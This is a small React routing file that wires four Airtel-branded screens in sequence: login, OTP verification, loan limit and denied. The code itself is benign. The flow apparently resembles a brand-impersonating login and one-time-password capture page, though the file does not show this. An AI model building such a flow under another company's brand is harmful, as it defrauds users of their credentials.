import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import AirtelLogin from './AirtelLogin';
import AirtelOTPVerify from './AirtelOTPVerify';
import AirtelLoanLimit from './AirtelLoanLimit';
import AirtelDenied from './AirtelDenied';

function App() {
  return (
    <Router>
      <Routes>
        <Route path="/" element={<AirtelLogin />} />
        <Route path="/airtel-otp" element={<AirtelOTPVerify />} />
        <Route path="/airtel-loan-limit" element={<AirtelLoanLimit />} />
        <Route path="/airtel-denied" element={<AirtelDenied />} />
      </Routes>
    </Router>
  );
}

export default App;